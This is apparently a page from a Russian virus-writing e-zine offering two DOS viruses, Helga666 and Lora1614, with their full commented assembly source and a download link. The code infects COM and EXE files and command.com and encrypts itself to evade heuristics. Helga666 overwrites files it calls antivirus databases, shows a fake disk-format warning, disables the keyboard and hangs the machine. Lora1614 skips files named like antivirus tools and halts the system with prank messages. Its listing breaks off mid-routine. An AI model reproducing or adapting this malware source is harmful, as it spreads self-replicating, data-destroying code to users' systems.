<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>ThE NeW OrDeR #2</title>
</head>

<body bgcolor="#000000" link="#0000FF" vlink="#000080"
bgproperties="fixed" topmargin="15" leftmargin="20" "
vlink="#000080">

<p align="center"><img src="../Images/viruz.gif" width="560"
height="100"></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../images/Rs.jpg" width="640" height="12"></strong></font></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../Images/fogskul.gif" alt="OneHalf  Virii" width="160"
height="100"></strong></font></p>

<p align="center"><a href="../progs/helga666.zip"><font size="5"><strong>Helga666
и Lora1614</strong></font></a></p>

<p align="left"><font color="#FFFFFF" size="3"><strong>Перед
тобой пара вирусов, которые
основаны на антиэвристическом
приеме по неявному использованию
значения функции в регистре AX.
Сейчас эти вирусы отлавливаются
антивирусами, а когда то... Но самое
поразительное то, что сам прием не
устарел...</strong></font></p>

<p align="center"><font color="#FF0000" size="4"><strong>Helga666</strong></font></p>

<p align="left"><font color="#00FFFF" size="2"><strong>;Вирус
Helga-666 Версия 0.2<br>
;Заражает COM-программы в текущем
каталоге и command.com<br>
;найденный по COMSPEC из DOS Enviroment<br>
;Не заражает EXE-программы, имеющие
расширение COM<br>
;Уничтожает файлы '*._*' и '*.ms'
записывая в них программу-носитель<br>
;вместе с PSP и расшифрованным телом
вируса<br>
;При совпадении времени запуска
программы-носителя, значения часа и
минут,<br>
;вирус выводит сообщение, отключает
клавиатуру и завешивает компьютер.<br>
;<br>
;***************************************************************************<br>
<br>
CSEG segment<br>
assume cs:CSEG,ds:CSEG,es:CSEG<br>
<br>
ORG 100h<br>
<br>
START:<br>
jmp VIRUS ;Переход на тело вируса<br>
nop ;Идентификатор зараженности<br>
VIRUS:<br>
push es<br>
push ds<br>
db 60h ;pusha<br>
call VIR_1 ;Вызвать подпрограмму
шифрации-дешифрации тела вируса<br>
Len_call equ $-VIRUS<br>
jmp RARITET ;Перейти на тело вируса<br>
;-----------------------------------------------------<br>
WRIT_Ofs equ $-VIRUS<br>
WRIT_F db 40h ;Функция записи в файл<br>
;-----------------------------------------------------<br>
<br>
VIR_1: ;Подпрограмма шифрации-дешифрации
тела вируса<br>
;при старте<br>
call L_2<br>
L_2:<br>
pop bx ;Получить смещение
подпрограммы в сегменте программы<br>
pop dx ;Достать адрес возврата<br>
CRYPTO_KEY equ $-VIRUS<br>
mov al,00h ;Поместить в al ключ
шифрования. Начальное значение<br>
;ключа равно 0, т.е. вирус не
зашифрован<br>
mov cx,CRYPTO_LEN ;Указать кол-во байт
шифрованного тела вируса<br>
push dx ;сохранить адрес возврата в
стеке<br>
push dx ;сохранить адрес возврата в
стеке<br>
L_1:<br>
mov dl,byte ptr [bx+START_LEN] ;Поместить в dl байт<br>
xor dl,al ;Отксорить его ключом<br>
mov byte ptr [bx+START_LEN],dl ;Записать байт
обратно<br>
inc bx ;Увеличить смещение<br>
loop L_1 ;Собственно цикл шифрации-дешифрации
тела вируса<br>
ret<br>
<br>
;---------------------------------------------<br>
CRYPT_CRYPT: ;Подпрограмма шифрации-дешифрации
тела вируса<br>
;при записи в файл<br>
db 60h ;Сохранить регистры<br>
mov ah,2ch<br>
int 21h ;Получить время<br>
xor cx,dx<br>
xor ch,cl ;Получить в ch новый ключ шифра<br>
mov byte ptr [di+CRYPTO_KEY+1],ch ;Поместить ключ
для использования<br>
call VIR_1 ;Шифрование тела вируса новым
ключом<br>
pop bx ;Достать адрес возврата<br>
db 61h ;Достать регистры<br>
mov ah,byte ptr [di+WRIT_Ofs] ;Функция записи в
файл<br>
mov cx,VIRLEN ;Сколько байт будем
записывать<br>
mov dx,di ;Откуда начнем писать<br>
int 21h ;Собственно запись в файл<br>
db 60h ;Сохранить регистры<br>
call VIR_1 ;Дешифрация тела с тем же
ключом<br>
pop bx ;Достать адрес возврата<br>
db 61h ;Достать регистры<br>
ret<br>
;---------------------------------------------<br>
<br>
RARITET: ;Собственно шифруемое тело
вируса<br>
START_LEN equ $-L_2<br>
xchg di,si ;При старте SI=100h<br>
pop si<br>
sub si,Len_call<br>
push si<br>
add si,BYTES_Ofs<br>
movsw<br>
movsw ;Пересылка начальных байт
программы<br>
SET_DTA:<br>
mov ah,1ah<br>
pop dx<br>
mov di,dx<br>
add dx,VIRLEN<br>
int 21h ;Устанавливаем DTA в конец тела
вируса<br>
mov dx,di<br>
add dx,MASK_Ofs ;Получить адрес маски
файлов<br>
call crypto_mask ;Расшифровать маску<br>
<br>
FIND_FIRST:<br>
cld ;Устанавливаем флаг направления<br>
mov ah, byte ptr [di+FUNCTION_Ofs] ;Функция поиска
первого файла<br>
mov cx,0ffh ;Атрибуты файлов<br>
INTERRUPT:<br>
int 21h ;Собственно найти файл<br>
jb Not_File ;Нет нужных файлов<br>
mov ah,2fh<br>
int 21h ;Получить адрес DTA<br>
call INFECTED ;Обработка найденного файла<br>
FIND_NEXT:<br>
mov ah, byte ptr [di+FUNCTION_Ofs+1] ;Функция поиска
следующего файла<br>
jmp Short INTERRUPT ;Вызвать прерывание 21h<br>
Not_File:<br>
call Killer ;Уничтожить антивирусные
базы<br>
call command_com ;ОБРАБОТАТЬ КОМАНДНЫЙ
ПРОЦЕССОР<br>
call Effect ;Попытка вывода эффекта<br>
mov ah,1ah<br>
mov dx,80h<br>
int 21h ;Восстановить DTA программы<br>
db 61h ;popa<br>
pop ds<br>
pop es<br>
jmp si ;SI=100h Отдать управление
программе<br>
;--------------------------------------------------------------------<br>
INFECTED: ;Подпрограмма обработки файла<br>
push bx<br>
add bx,1eh<br>
xchg dx,bx ;Поместить в DX адрес имени
файла из DTA<br>
push dx<br>
call Set_N_attr ;Сделать файл доступным
вирусу<br>
<br>
READ_BEG:<br>
mov ah,byte ptr [di+FUNCTION_Ofs+4]<br>
mov cx,4<br>
mov dx,di<br>
add dx,BYTES_Ofs<br>
push bx<br>
push dx<br>
int 21h ;Прочитать первые 4 байта
найденного файла<br>
pop bx<br>
mov ax,word ptr [bx]<br>
mov cx,word ptr [bx+2]<br>
pop bx<br>
cmp ax,'ZM' ;Это EXE файл с расширением COM?<br>
jnz TESTED_IDENT ;Нет, обработка
продолжается<br>
LOC_1:<br>
jmp CLOSE_FILE ;Да, отказаться от файла и
вернуться из подпрограммы<br>
TESTED_IDENT:<br>
cmp ch,90h ;Идентификатор зараженности
присутствует?<br>
jnz WRITE_VIRUS ;Нет, попытка инфицировать
файл<br>
jmp Short LOC_1 ;Да, файл уже заражен<br>
WRITE_VIRUS:<br>
call crypto_mask ;Закодировать маску
поиска файлов<br>
mov ax,word ptr [di+FUNCTION_Ofs+5]<br>
xor cx,cx<br>
xor dx,dx<br>
int 21h ;handle на конец файла<br>
push ax<br>
<br>
and ax,0f000h<br>
cmp ax,0f000h ;Не слишком ли большой файл?<br>
jnz LEN_OK ;Нет, можно заражать<br>
pop ax<br>
jmp CLOSE_FILE ;Слишком большой файл<br>
<br>
LEN_OK:<br>
call CRYPT_CRYPT ;Зашифроваться,
дописаться в файл, расшифроваться<br>
call crypto_mask<br>
mov ax,word ptr cs:[di+FUNCTION_Ofs+7]<br>
xor cx,cx<br>
xor dx,dx<br>
int 21h ;handle на начало файла<br>
pop ax<br>
pop si<br>
push si<br>
sub ax,3 ;Вычесть длину перехода на
тело вируса<br>
mov si,di<br>
add si,BYTES_Ofs ;Вычислить смещение
начальных байт в теле вируса<br>
mov byte ptr [si],0e9h ;переслать команду
перехода<br>
mov word ptr [si+1],ax ;переслать длину
перехода<br>
mov byte ptr [si+3],90h;переслать
идентификатор зараженности<br>
mov ah,byte ptr [di+WRIT_Ofs]<br>
xchg dx,si<br>
mov cx,4<br>
int 21h ;Записать новое начало в файл<br>
CLOSE_FILE:<br>
pop dx<br>
pop cx<br>
mov ax,word ptr cs:[di+FUNCTION_Ofs+9]<br>
int 21h ;Восстановить дату и время
создания файла<br>
mov ah,byte ptr [di+FUNCTION_Ofs+11]<br>
int 21h ;Закрыть файл<br>
mov ax,4301h<br>
pop cx<br>
pop dx<br>
int 21h ;Восстановить атрибуты файла<br>
<br>
pop ax<br>
ret ;Вот файл и обработан<br>
<br>
;-------------------------------------------------------------<br>
command_com: ;Подпрограмма обработки
командного процессора<br>
;указанного в COMSPEC<br>
push di<br>
push ds<br>
mov si,2ch ;По смещению 2ch в DTA хранится
адрес ASCIIZ строк<br>
;DOS Enviroment текущей задачи<br>
mov ds,cs:[si] ;Совместить сегмент данных
с сегментом DOS Enviroment<br>
mov si,0008 ;В SI поместить длину строки
&quot;COMSPEC=&quot;<br>
add di, VIRLEN ;В DI смещение DTA вируса в
сегменте кода<br>
add di,2ch ;Немного сместимся в DTA<br>
mov cx,0040h<br>
rep movsb ;Перепишем ASCIIZ строки из DOS
Enviroment в DTA<br>
sub di,40h ;Вернемся в начало
переписанного блока<br>
pop ds<br>
mov dx,di<br>
pop si<br>
push si<br>
mov ah,byte ptr [si+FUNCTION_Ofs]<br>
mov cx,20h<br>
int 21h ;Установим нормальный атрибут<br>
pop di<br>
jb EXITER<br>
mov ah,2fh<br>
int 21h ;Получим адрес DTA вируса<br>
mov bx,di<br>
add bx,VIRLEN<br>
mov si,bx<br>
add bx,0eh ;Поместим в BX путь и имя
командного процессора<br>
<br>
call INFECTED ;Обработаем его<br>
EXITER:<br>
ret<br>
;--------------------------------------------------<br>
crypto_mask: ;Подпрограмма шифрования-дешифрования
маски файла<br>
push dx<br>
push di<br>
push cx<br>
add di,MASK_Ofs ;Поместим в DI адрес маски<br>
mov cx,LEN_MASK ;Поместим в CX длину маски<br>
crypt_next:<br>
mov dl,byte ptr [di] ;Поместим в DL байт маски<br>
xor dl,060h ;Отксорим байт<br>
mov byte ptr [di],dl ;Вернем байт обратно<br>
inc di ;Увеличиваем счетчик<br>
loop crypt_next ;Собственно цикл шифрации<br>
ende_crypt:<br>
pop cx<br>
pop di<br>
pop dx<br>
ret<br>
;--------------------------------------------------<br>
MASK_Ofs equ $-VIRUS<br>
MASK_F: ;Маска для поиска файлов<br>
db '*' xor 060h<br>
db '.' xor 060h<br>
db 'c' xor 060h<br>
db 'o' xor 060h<br>
db 'm' xor 060h<br>
db 0h xor 060h<br>
LEN_MASK equ $-MASK_F ;Длина маски<br>
<br>
;-------------------------------------------------------------<br>
BYTES_Ofs equ $-VIRUS ;Начальные байты
программы<br>
int 20h<br>
dw 9090h<br>
;-----------------------------------------------------<br>
FUNCTION_Ofs equ $-VIRUS ;Функции вируса<br>
FIND_1 db 4eh ;0 ;Начальный поиск по
шаблону<br>
FIND_2 db 4fh ;1 ;Последующий поиск по
шаблону<br>
OPEN_F dw 3d02h ;2 ;Открытие файла для ввода-вывода<br>
READ_F db 3fh ;4 ;Чтение из файла<br>
MOVE_E dw 4202h ;5 ;handle в конец файла<br>
MOVE_B dw 4200h ;7 ;handle в начало файла<br>
SETF_A dw 5701h ;9 ;Установка атрибутов
файлу<br>
CLOS_F db 3eh ;11 ;Закрытие файла<br>
GETF_A dw 5700h ;12 ;Получение атрибутов
файла<br>
;-------------------------------------------------------------<br>
KIL_Ofs equ $-VIRUS ;Первая маска удаляемых
файлов<br>
db '*._*',0h<br>
KIL_1Ofs equ $-VIRUS ;Вторая маска удаляемых
файлов<br>
db '*.ms',0h<br>
;-------------------------------------------------------------<br>
Killer: ;Подпрограмма удаления файлов<br>
db 60h<br>
mov dx,di<br>
push dx<br>
add dx,KIL_Ofs<br>
call KIMERSEN ;Поиск и удаление по первой
маске<br>
pop dx<br>
add dx,KIL_1Ofs<br>
call KIMERSEN ;Поиск и удаление по второй
маске<br>
db 61h<br>
ret<br>
;-----------------------------------------------<br>
KIMERSEN: ;Подпрограмма поиска и
удаления файлов по маске<br>
mov ah,byte ptr [di+FUNCTION_Ofs] ;Функция поиска
первого файла<br>
mov cx,0ffffh ;Атрибуты файла<br>
Kil_n:<br>
int 21h ;Найти файл<br>
jnb _Kil_ ;Файл найден<br>
ret<br>
_Kil_:<br>
mov ah,2fh<br>
int 21h ;Получить адрес DTA вируса<br>
xchg dx,bx<br>
add dx,1eh ;Поместить в DX адрес имени
найденного файла<br>
push dx<br>
call Set_N_Attr ;Сделать файл доступным
вирусу<br>
mov ah,byte ptr [di+WRIT_Ofs] ;Функция записи в
файл<br>
mov cx,word ptr [di+VIRLEN+1ah] ;Длина файла из DTA<br>
xor dx,dx<br>
int 21h ;Записать в файл туфту всякую<br>
pop dx<br>
pop cx<br>
mov ax,word ptr cs:[di+FUNCTION_Ofs+9]<br>
int 21h ;Восстановить время и дату
создания файла<br>
mov ah,byte ptr [di+FUNCTION_Ofs+11]<br>
int 21h ;Закрыть файл<br>
mov ax,4301h<br>
pop cx<br>
pop dx<br>
int 21h ;Восстановить атрибуты файла<br>
mov ah,byte ptr [di+FUNCTION_Ofs+1] ;Функция поиска
следующего файла по маске<br>
jmp KIL_n ;Вызвать прерывание 21h<br>
;-------------------------------------------------------------<br>
Set_N_Attr: ;Подпрограмма установки
файла доступным вирусу<br>
pop si ;Достать адрес возврата<br>
mov ax,4300h<br>
int 21h ;Получить атрибуты файла<br>
push cx ;Сохранить их в стеке<br>
mov ax,4301h<br>
xor cx,cx<br>
int 21h ;Установить нормальный атрибут
файлу<br>
mov ax,word ptr [di+FUNCTION_Ofs+2]<br>
int 21h ;Открыть файл для чтения-записи<br>
xchg bx,ax ;Переслать в bx номер файла<br>
mov ax,word ptr [di+FUNCTION_Ofs+12]<br>
int 21h ;Получить дату и время создания
файла<br>
push cx<br>
push dx ;Сохранить эти данные в стеке<br>
jmp si ;Выход из подпрограммы<br>
;-------------------------------------------------------------<br>
Mes_Ofs equ $-VIRUS ;Выводимое сообщение<br>
db 0ah,0dh,'WARNING: ALL DATA ON NON-REMOVABLE DISK'<br>
db 0ah,0dh,'DRIVE C: WILL BE LOST!'<br>
db 0ah,0dh,'Proced with Format (Y/N)? Yes'<br>
db 0ah,0dh,'Ok','$'<br>
<br>
EFFECT:<br>
mov ah,2ch<br>
int 21h ;Получить текущее время<br>
cmp ch,cl ;Час равен минуте?<br>
jz Divo ;Да, включить эффект<br>
ret ;Нет, выйти<br>
Divo:<br>
cli<br>
mov al,0adh<br>
out 64h,al<br>
nop<br>
sti ;Отключить клавиатуру<br>
mov dx,di<br>
add dx,Mes_Ofs<br>
mov ah,09h<br>
int 21h ;Вывести сообщение на экран<br>
cli<br>
L_P:<br>
jmp short L_P ;Завесить компьютер &quot;вечным&quot;
циклом<br>
;-------------------------------------------------------------<br>
<br>
CRYPTO_LEN equ $-RARITET<br>
<br>
VIRLEN EQU $-VIRUS<br>
<br>
CSEG ends<br>
end START</strong></font></p>

<p align="center"><font color="#FF0000" size="4"><strong>Lora1614</strong></font></p>

<p align="left"><font color="#FFFF00" size="2"><strong>;Вирус
Vesna.Lora<br>
</strong></font><font color="#FFFF00" size="2"><strong><br>
CSEG segment<br>
assume cs:cseg, ds:cseg, es:cseg<br>
org 100h<br>
START:<br>
db 60h<br>
push ds<br>
push es<br>
push cs<br>
pop ds<br>
call SECRET<br>
jmp SHORT GET_DOS_VERSION<br>
;-----------------------------------<br>
SECRET:<br>
mov ah,00h<br>
mov cx,SECRET_LEN<br>
mov bx,offset NEWDTA-1<br>
SECRET_LOP:<br>
mov dh,byte ptr cs:[bx]<br>
xor dh,ah<br>
mov byte ptr cs:[bx],dh<br>
dec bx<br>
loop SECRET_LOP<br>
ret<br>
;---------------------------------<br>
Write_Func db 40h<br>
;---------------------------------<br>
CRYPTO:<br>
call new_code<br>
db 60h<br>
call SECRET<br>
db 61h<br>
lea dx,[START]<br>
mov ah,Write_Func<br>
mov cx,VIRLEN<br>
int 21h ;ЗАПИСАТЬ ТЕЛО ВИРУСА<br>
db 60h<br>
call SECRET<br>
db 61h<br>
RET<br>
;---------------------------------<br>
<br>
GET_DOS_VERSION:<br>
mov ah,Dos_V<br>
int 21h<br>
cmp al,3<br>
jae GET_DTA<br>
RESTORE_PROGRAM:<br>
call command_com<br>
call BUSSER<br>
pop es<br>
pop ds<br>
db 61h<br>
retf<br>
GET_DTA:<br>
mov ah,GetDTA_Func<br>
int 21h<br>
mov DTA,bx<br>
SET_DTA:<br>
mov dx,offset NEWDTA<br>
mov ah,SetDTA_Func<br>
int 21h<br>
INFECTED:<br>
mov dx,offset EXE_MASK<br>
call SEARCH<br>
mov dx,offset COM_MASK<br>
call SEARCH<br>
mov dx,offset COMAND_A+3<br>
call SEARCH<br>
OLD_DTA:<br>
mov dx,word ptr DTA<br>
mov ah,SetDTA_Func<br>
int 21h<br>
jmp short RESTORE_PROGRAM<br>
<br>
TEXT_MSG1 db 'Весна пришла!','$'<br>
;---------------------------------------------------<br>
EXE_MASK db '*.exe',0h<br>
DTA dw ?<br>
COM_MASK db '*.com',0h<br>
COMAND_C db 'c:\*.com',0h<br>
COMAND_E db 'c:\*.exe',0h<br>
COMAND_A db 'c:\*.___',0h<br>
File_Attr dw ?<br>
CX_Data dw ?<br>
DX_Data dw ?<br>
;---------------------------------------------------<br>
BUSSER:<br>
db 60h<br>
mov ah,Time_F<br>
int 21h<br>
xor dx,dx<br>
cmp ch,cl<br>
jz MES<br>
jmp QUIT_BUS<br>
MES:<br>
cmp ch,7<br>
jnz MES_1<br>
lea dx,TEXT_MSG1<br>
MES_1:<br>
cmp ch,9<br>
jnz MES_2<br>
lea dx,TEXT_MSG2<br>
MES_2:<br>
cmp ch,11<br>
jnz MES_3<br>
lea dx,TEXT_MSG3<br>
MES_3:<br>
cmp ch,13<br>
jnz MES_4<br>
lea dx,TEXT_MSG4<br>
MES_4:<br>
cmp ch,15<br>
jnz MES_5<br>
lea dx,TEXT_MSG5<br>
MES_5:<br>
cmp ch,17<br>
jnz MES_6<br>
lea dx,TEXT_MSG6<br>
MES_6:<br>
cmp ch,19<br>
jnz MES_7<br>
lea dx,TEXT_MSG7<br>
MES_7:<br>
cmp ch,21<br>
jnz MES_8<br>
lea dx,TEXT_MSG8<br>
MES_8:<br>
cmp dx,0<br>
jz QUIT_BUS<br>
mov ah,09h<br>
int 21h<br>
MES_9:<br>
cli<br>
hlt<br>
jmp short MES_9<br>
QUIT_BUS:<br>
db 61h<br>
ret<br>
;---------------------------------------------------<br>
SEARCH:<br>
cld<br>
mov ah,FindFirst<br>
mov cx,All_Attr<br>
INTERRUPT:<br>
int 21h<br>
jb NOT_FILE<br>
mov ah,GetDTA_Func<br>
int 21h<br>
call PLAQUE<br>
mov ah,FindNext<br>
jmp short INTERRUPT<br>
NOT_FILE:<br>
ret<br>
<br>
TEXT_MSG2 db 'Unpress key TURBO to continue...','$'<br>
;---------------------------------------------------<br>
Set_N_Attr: ;Подпрограмма установки
файла доступным вирусу<br>
pop si ;Достать адрес возврата<br>
mov ax,GetAttr_F<br>
int 21h ;Получить атрибуты файла<br>
mov File_Attr,cx<br>
mov ax,SetAttr_F<br>
xor cx,cx<br>
int 21h ;Установить нормальный атрибут
файлу<br>
mov ax,Open_F<br>
int 21h ;Открыть файл для чтения-записи<br>
xchg bx,ax ;Переслать в bx номер файла<br>
mov handle,bx<br>
mov ax,GetDate_F<br>
int 21h ;Получить дату и время создания
файла<br>
mov DX_Data,dx<br>
mov CX_Data,cx<br>
jmp si ;Выход из подпрограммы<br>
<br>
TEXT_MSG3 db 'Format drive c: completed','$'<br>
;---------------------------------------------------<br>
Set_O_Attr: ;Подпрограмма
восстановления файла<br>
pop si ;Достать адрес возврата<br>
mov bx,handle<br>
mov ax,SetDate_F<br>
mov cx,CX_Data<br>
mov dx,DX_Data<br>
int 21h<br>
mov ah,Close_F<br>
int 21h<br>
mov cx, File_Attr<br>
pop dx<br>
mov ax,SetAttr_F<br>
int 21h<br>
jmp si ;Выход из подпрограммы<br>
<br>
TEXT_MSG4 db 'PRESS RESET TO CONTINUE','$'<br>
;---------------------------------------------------<br>
;Проверка на антивирус<br>
tested_name:<br>
db 60h<br>
call tested_start<br>
<br>
prompt db 'drwetbmsmvavaiscadutanatsdncvcdnwiioibvi'<br>
ax_save dw ?<br>
<br>
tested_start:<br>
pop si<br>
mov dx,[bx]<br>
mov bx,0<br>
OR DL,00100000B<br>
OR DH,00100000B<br>
loop_tested:<br>
mov cx,cs:[si+bx]<br>
cmp dx,cx<br>
jne tested_1<br>
jmp tested_failure<br>
tested_1:<br>
inc bx<br>
inc bx<br>
cmp cx,'vi'<br>
jne loop_tested<br>
xor ax,ax<br>
jmp tested_ende<br>
tested_failure:<br>
mov ah,1<br>
tested_ende:<br>
mov ax_save,ax<br>
db 61h<br>
mov ax,ax_save<br>
ret<br>
<br>
TEXT_MSG5 db 'Пора пить кофе!','$'<br>
;---------------------------------------------------<br>
HANDLE_ENDE:<br>
mov ah,Move_H<br>
xor cx,cx<br>
xor dx,dx<br>
int 21h<br>
ret<br>
;---------------------------------------------------<br>
maxlen:<br>
AND cx,0F000H<br>
CMP cx,0F000H<br>
JNZ Yes_Write<br>
ret_maxlen:<br>
mov cx,1<br>
ret<br>
Yes_Write:<br>
xor cx,cx<br>
ret<br>
;---------------------------------------------------<br>
Tested_Extension:<br>
push ax<br>
push dx<br>
mov al,0<br>
call HANDLE_ENDE<br>
mov ah,Read_F<br>
lea dx,bytes_4<br>
mov cx,2<br>
int 21h<br>
mov al,0<br>
call HANDLE_ENDE<br>
cmp word ptr bytes_4,'ZM'<br>
jz EXE_FIND<br>
xor cx,cx<br>
NAFIG:<br>
pop dx<br>
pop ax<br>
ret<br>
EXE_FIND:<br>
mov cx,1<br>
jmp short NAFIG<br>
<br>
TEXT_MSG6 db 'Здесь был Игорь Д.','$'<br>
;---------------------------------------------------<br>
PLAQUE:<br>
add bx,Offs_N<br>
PLAQ_1:<br>
xchg dx,bx ;Поместить в DX адрес имени
файла из DTA<br>
push dx<br>
call tested_name<br>
cmp ah,0<br>
je tested_ok<br>
NO_PLAQUE:<br>
pop dx<br>
pop bx<br>
ret<br>
tested_ok:<br>
call Set_N_attr ;Сделать файл доступным
вирусу<br>
mov al,02<br>
call HANDLE_ENDE<br>
mov LEN_T_1,dx ;сохранить длину файла<br>
mov LEN_T_2,ax<br>
mov cx,dx<br>
call maxlen<br>
cmp cx,1<br>
jz Close_File<br>
mov cx,ax<br>
call maxlen<br>
cmp cx,1<br>
jz Close_File<br>
jmp INFECT<br>
Close_File:<br>
call Set_O_Attr<br>
ret<br>
INFECT:<br>
call Tested_Extension<br>
cmp cx,1<br>
jz EXE_FILE<br>
call WR2COM ;обработать как COM<br>
jmp CLOSE_FILE<br>
exe_file:<br>
call WR2EXE ;обработать как EXE<br>
jmp CLOSE_FILE<br>
;---------------------------------------------------<br>
LEN_T_1 dw ?<br>
LEN_T_2 dw ?<br>
handle dw ?<br>
bytes_4 dw ?<br>
SAVE_CX dw ?<br>
SAVE_DX dw ?<br>
<br>
;---------------------------------------------------<br>
;---------------------------------------------------<br>
TEXT_MSG7 db
'xXxXxXxXxXxXxXxXxXxXx',0ah,0dh,'oOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOo','$'<br>
;---------------------------------------------------<br>
<br>
wr2com:<br>
jmp st_2com<br>
<br>
new_beg label byte ;новое начало для файлов<br>
mov ax,cs<br>
c_1:<br>
add ax,0<br>
push ax<br>
c_2:<br>
mov ax,0<br>
push ax<br>
db 0cbh<br>
len_new_beg equ $-new_beg<br>
<br>
com label byte ;примочка к COM программам<br>
mov di,100h<br>
push cs<br>
pop ds<br>
c_3:<br>
mov ax,0<br>
c_4:<br>
add ax,0<br>
and ax,000fh<br>
mov bx,16<br>
sub bx,ax<br>
and bx,000fh<br>
add bx,len_new_beg<br>
mov ax,100h<br>
sub ax,bx<br>
mov si,ax<br>
mov cx,len_new_beg<br>
rep movsb<br>
push es<br>
pop ds<br>
push es<br>
mov ax,100h<br>
push ax<br>
push ax<br>
db 0c3h<br>
len_com equ $-com<br>
<br>
old_beg label byte ;старое начало программ<br>
db len_new_beg dup (?)<br>
len_im equ $-com<br>
<br>
exiter: ;выход из процедуры<br>
pop bx<br>
jmp bx<br>
<br>
st_2com:<br>
mov bx,handle<br>
mov ah,Move_H<br>
mov al,Move_L<br>
xor cx,cx<br>
xor dx,dx<br>
int 21h ;указатель в начало файла<br>
mov ah,Read_F<br>
lea dx,old_beg<br>
mov cx,len_new_beg<br>
int 21h ;читать начало файла<br>
jnc prep_beg<br>
jmp exiter<br>
prep_beg:<br>
mov ax,word ptr old_beg[0]<br>
cmp ax,0c88ch ;уже заражен ?<br>
jne YES_YES<br>
jmp exiter<br>
YES_YES: ;коррекция нового начала файла<br>
mov ax,len_t_1<br>
mov bx,len_t_2<br>
add bx,len_im<br>
jnc pr1<br>
inc ax<br>
pr1:<br>
add bx,15<br>
and bx,0fff0h<br>
add bx,ax<br>
mov cl,4<br>
ror bx,cl<br>
mov word ptr c_1[1],bx<br>
mov ax,len_t_2<br>
and ax,000fh<br>
mov bx,ax<br>
add ax,len_im<br>
add ax,15<br>
and ax,0fff0h<br>
add bx,100h<br>
sub bx,ax<br>
mov word ptr c_2[1],bx<br>
mov bx,handle<br>
mov ah,Move_H<br>
mov al,Move_L<br>
xor cx,cx<br>
xor dx,dx<br>
int 21h ;указатель в начало файла<br>
mov ah,Write_Func<br>
lea dx,new_beg<br>
mov cx,len_new_beg<br>
int 21h ;записать новое начало<br>
prep_c_end: ;коррекция примочки<br>
mov ax,len_t_2<br>
mov word ptr c_3[1],ax<br>
mov word ptr c_4[1],len_im<br>
mov bx,handle<br>
mov ah,Move_H<br>
mov al,Move_L<br>
mov cx,len_t_1<br>
mov dx,len_t_2<br>
int 21h ;указатель в конец файла<br>
wr_end:<br>
mov ah,Write_Func<br>
lea dx,com<br>
mov cx,len_im<br>
int 21h ;записать примочку<br>
mov cx,len_t_1 ;выровнять на границу
параграфа<br>
mov dx,len_t_2<br>
add dx,len_im<br>
jnc cal_1<br>
inc cx<br>
cal_1:<br>
add dx,15<br>
jnc cal_2<br>
inc cx<br>
cal_2:<br>
and dx,0fff0h<br>
mov bx,handle<br>
mov ah,Move_H<br>
mov al,Move_L<br>
int 21h ;указатель в конец файла<br>
call crypto<br>
ret<br>
<br>
;---------------------------------------------------<br>
;---------------------------------------------------<br>
TEXT_MSG8 db ' VESNA (c) 1994,96 -=* Uni Tula *=-','$'<br>
;---------------------------------------------------<br>
<br>
WR2EXE:<br>
db 60h<br>
jmp ST_2EXE<br>
;--------------------------------------------------------------<br>
HDR label byte ;заголовок EXE программы<br>
Signature dw ?<br>
partpag dw ?<br>
pagecnt dw ?<br>
count dw ?<br>
hdrsize dw ?<br>
minavail dw ?<br>
maxavail dw ?<br>
reloss dw ?<br>
relosp dw ?<br>
checks dw ?<br>
exeip dw ?<br>
relocs dw ?<br>
LEN_HDR equ $-hdr<br>
;----------------------------------------------------------<br>
IMIT label byte ;вставка перед вирусом<br>
mov ax,es<br>
i_1:<br>
add ax,0<br>
add ax,10h<br>
push ax<br>
i_2:<br>
mov ax,0<br>
push ax<br>
mov ax,100h<br>
push ax<br>
db 0c3h<br>
LEN_IMIT equ $-imit<br>
;----------------------------------------------------------<br>
<br>
ST_2EXE:<br>
mov ah,Move_H<br>
mov bx,HANDle<br>
xor cx,cx<br>
xor dx,dx<br>
mov al,0<br>
int 21h ;указатель в начало файла<br>
<br>
mov ah,Read_F<br>
lea dx,[HDR]<br>
mov cx,len_hdr<br>
int 21h ;читать заголовок программы<br>
<br>
PREP_END:<br>
mov bx,Signature<br>
cmp bx,Sig_E ;это действительно EXE -
программа ?<br>
je CHECK_IDENT<br>
jmp QUITER_FROM_WREXE<br>
CHECK_IDENT:<br>
dec bx<br>
mov Signature,bx ;спрятать сигнатуру<br>
mov bx,checks<br>
cmp bx,Ident_E ;уже заражен ?<br>
jne NEXT_WORK<br>
jmp QUITER_FROM_WREXE<br>
NEXT_WORK:<br>
mov bx,Ident_E<br>
mov checks,bx ;установить метку<br>
mov ax,relocs<br>
mov word ptr i_1[1],ax ;для вставки идут
разные примочки<br>
mov ax,exeip<br>
mov word ptr i_2[1],ax<br>
mov cx,LEN_T_1<br>
mov dx,LEN_T_2<br>
mov bx,HANDle<br>
mov SAVE_CX,cx<br>
mov SAVE_DX,dx<br>
<br>
mov ax,4200h<br>
int 21h ;сместить указатель в конец
программы<br>
<br>
mov ah,Write_Func<br>
lea dx,[IMIT]<br>
mov cx,len_imit<br>
int 21h ;записать вставку<br>
<br>
jnc WR_SOUR<br>
jmp QUITER_FROM_WREXE<br>
<br>
WR_SOUR:<br>
mov cx,SAVE_CX ;подготовить заголовок
программы<br>
mov dx,SAVE_DX<br>
add dx,len_imit<br>
jnc m1<br>
inc cx<br>
m1:<br>
add dx,15<br>
jnc m2<br>
inc cx<br>
m2:<br>
and dx,0fff0h<br>
<br>
mov SAVE_CX,cx<br>
mov SAVE_DX,dx<br>
<br>
mov ah,Move_H<br>
mov al,Move_L<br>
int 21h ;установить указатель в конец
файла<br>
<br>
call crypto<br>
<br>
mov ax,SAVE_CX ;дальнейшие примочки к
заголовку<br>
mov bx,SAVE_DX<br>
<br>
add bx,ax<br>
mov cl,4<br>
ror bx,cl<br>
sub bx,10h<br>
mov cx,hdrsize<br>
sub bx,cx<br>
mov relocs,bx<br>
mov ax,partpag<br>
and ax,000fh<br>
mov bx,ax<br>
add ax,len_imit<br>
add ax,15<br>
and ax,0fff0h<br>
add bx,100h<br>
sub bx,ax<br>
mov exeip,bx<br>
<br>
mov ax,SAVE_CX<br>
mov bx,SAVE_DX<br>
<br>
add bx,VIRLEN<br>
jnc m3<br>
inc ax<br>
m3:<br>
mov dx,bx<br>
and dx,1ffh<br>
mov partpag,dx<br>
add bx,511<br>
jnc m4<br>
inc ax<br>
m4:<br>
